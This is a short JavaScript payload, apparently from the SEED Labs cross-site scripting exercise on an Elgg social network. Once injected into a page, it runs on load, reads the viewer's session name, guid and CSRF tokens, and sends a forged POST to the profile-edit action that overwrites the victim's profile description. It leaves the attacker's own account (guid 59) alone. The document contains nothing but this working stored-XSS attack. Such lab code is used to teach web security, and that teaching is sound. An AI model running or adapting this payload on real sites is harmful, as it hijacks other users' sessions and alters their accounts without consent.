<script type="text/javascript">
	window.onload = function () {
		var userName="&name="+elgg.session.user.name;
		var guid="&guid="+elgg.session.user.guid;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var sendurl="http://www.seed-server.com/action/profile/edit";
		
		var content="description=<p>MODIFIED!</p>"+ts+token+guid+userName;
		var samyGuid=59;
		
		if(elgg.session.user.guid!=samyGuid) {
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST", sendurl, true);
			Ajax.setRequestHeader("Content-Type", 
						"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>
